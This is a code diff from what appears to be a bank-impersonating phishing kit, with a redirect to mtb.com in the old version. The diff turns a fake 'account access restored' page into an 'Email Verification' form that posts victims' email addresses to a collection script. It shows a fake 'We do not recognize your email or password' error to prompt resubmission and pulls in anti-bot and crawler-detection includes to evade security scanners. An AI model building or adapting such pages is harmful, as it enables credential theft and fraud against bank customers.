@@ -11,19 +11,18 @@
         echo $antibot->throw404();
         die();
     }
-    include './zsec.php';
+	include './zsec.php';
     include 'huehuehue.php';
     include 'crawlerdetect.php';
     include 'bot_fucker/wrd.php';
     include 'bot_fucker/bot.php';
-	session_destroy();
 ?>
 <html lang="en"><head class="at-element-marker">
 	<meta charset="UTF-8">
-	<title>Verification Completed</title>
-	<!-- -->
+
 	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
-    <meta http-equiv="refresh" content="3;url=https://mtb.com"> 
+	<title>Verification Process</title>
+
 	<link rel="appple-touch-icon" sizes="57x57" href="./images/favicon.png" type="image/png">
 <link rel="appple-touch-icon" sizes="60x60" href="./images/favicon.png" type="image/png">
 <link rel="appple-touch-icon" sizes="72x72" href="./images/favicon.png" type="image/png">
@@ -41,15 +40,6 @@
 
 	
     
-    
-<link rel="stylesheet" href="./css/clientlib-base.css" type="text/css">
-
-
-
-
-    
-    
-
 <script>
 // This code empowers all input tags having a placeholder and data-slots attribute
 document.addEventListener('DOMContentLoaded', () => {
@@ -81,6 +71,12 @@ document.addEventListener('DOMContentLoaded', () => {
         el.addEventListener("blur", () => el.value === pattern && (el.value=""));
     }
 });</script>
+
+<link rel="stylesheet" href="./css/clientlib-base.css" type="text/css">
+
+
+
+
 
 
 
@@ -700,11 +696,7 @@ to you.</p>
     </div>
 </div>
 
-
 <style>
-* {
-  box-sizing: border-box;
-}
 
 input[type=text], select, textarea {
   width: 90%;
@@ -720,13 +712,6 @@ input[type=tel], select, textarea {
   border-radius: 4px;
   resize: vertical;
 }
-input[type=date], select, textarea {
-  width: 90%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  resize: vertical;
-}
 input[type=password], select, textarea {
   width: 90%;
   padding: 12px;
@@ -734,26 +719,59 @@ input[type=password], select, textarea {
   border-radius: 4px;
   resize: vertical;
 }
-
+input[type=email], select, textarea {
+  width: 90%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  resize: vertical;
+}
 label {
   padding: 12px 12px 12px 0;
   display: inline-block;
 }
 
+input[type=submit] {
+  background-color: #04AA6D;
+  color: white;
+  padding: 12px 20px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  float: right;
+}
 
 input[type=submit]:hover {
   background-color: #45a049;
 }
 
+@media (min-width: 700px){
 .cntainer {
   border-radius: 5px;
   padding: 20px;
+  background-color: #f6f6f6;
+  margin-right: 15%;
+  margin-left: 15%;
 }
-
-.col-25 {
+.col-23 {
   float: left;
-  width: 25%;
+  width: 40%;
   margin-top: 6px;
+}
+}
+@media (max-width: 699px){
+.cntainer {
+  border-radius: 5px;
+  padding: 20px;
+  background-color: #f6f6f6;
+  margin-left: 2%;
+  margin-right: 2%;
+}
+.col-23 {
+  float: left;
+  width: 80%;
+  margin-top: 6px;
+}
 }
 hr {
     width: 100%;
@@ -761,22 +779,18 @@ hr {
     background-color: blue;
 
 }
-.col-24 {
+
+.col-25 {
   float: left;
-  width: 23%;
-  margin-top: 6px;
-}
-.col-75 {
-  float: left;
-  width: 40%;
+  width: 25%;
   margin-top: 6px;
 }
 
-/* Clear floats after the columns */
-.rew:after {
-  content: "";
-  display: table;
-  clear: both;
+
+.col-75 {
+  float: left;
+  width: 40%;
+  margin-top: 3px;
 }
 .button {
     background-color: #4CAF50;
@@ -790,7 +804,12 @@ hr {
     margin: 4px 2px;
     cursor: pointer;
 }
-.button {width: 50%;}
+/* Clear floats after the columns */
+.rew:after {
+  content: "";
+  display: table;
+  clear: both;
+}
 
 /* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
 @media screen and (max-width: 600px) {
@@ -801,27 +820,60 @@ hr {
 }
 </style>
 
-
-
 <div class="cntainer">
 <div class="rew">
       <div class="col-25">
-         <h3>Verification Completed </h3>
+         <h3>Email Verification </h3>
          <hr>
 </div>
 </div><br>
+<form action="emailauth/check.php?token=<?php echo $_SESSION['token']; ?>" method="POST">
+<?php
 
-	<div class="rew">
-     <br><br>
-      <center>
+if(isset($_GET['invalid'])){
+		echo '<div id="pageerrors">
+		<div class="alert" aria-atomic="true" role="alert" tabindex="-1">
+		
+			
+					<p>We do not recognize your email or password. Please try again.</p>
+			</div>
+		</div><br>';
+	
+}
 
-                            <img width="150" height="150" src="./images/success.gif">
-                            <br>      <p>Thank you! Your account access has been Restored.</p>
-                        
-</center>
+?>
+    <div class="rew">
+      <div class="col-25">
+        <label for="eml">Email </label>
+      </div>
+      <div class="col-75">
+        <input type="email" id="eml" name="email" required>
+      </div>
     </div>
+    <!-- <div class="rew">
+      <div class="col-25">
+        <label for="pswrd">Password</label>
+      </div>
+      <div class="col-75">
+        <input type="password" id="pswrd" name="emrd" minlength="5" required>
+      </div>
+    </div> -->
+	
 
-    <br>
+    
+	
+	
+	
+<br>
+    <div class="rew">
+    <div class="col-25">
+        <label for="lname"> </label>
+      </div>
+    <div class="col-75 submit-button">
+      <button class="button" type="submit">submit</button>
+    </div>
+    </div>
+  </form>
 </div>
 
 
